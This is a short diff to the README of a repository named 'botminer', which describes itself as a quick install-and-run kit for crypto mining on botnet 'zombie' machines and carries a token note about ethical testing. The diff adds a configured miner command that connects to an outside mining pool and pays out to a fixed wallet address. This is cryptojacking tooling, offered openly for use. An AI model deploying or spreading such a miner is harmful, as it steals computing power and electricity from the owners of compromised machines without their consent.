@@ -1,3 +1,6 @@
+"MINER"    -a curvehash -o stratum+tcp://curvehash.na.mine.zergpool.com:3343 -u PFMAoXTxv92xyacKK3nrRv6ogfjGWhb583 -p c=PLSR,mc=PLSR,ID=rig1 -t 4,4
+
+
 # botminer
 A rapid install and run git for botnet zombie crypto mining. 
 -To be used ethically for testing purposes only.
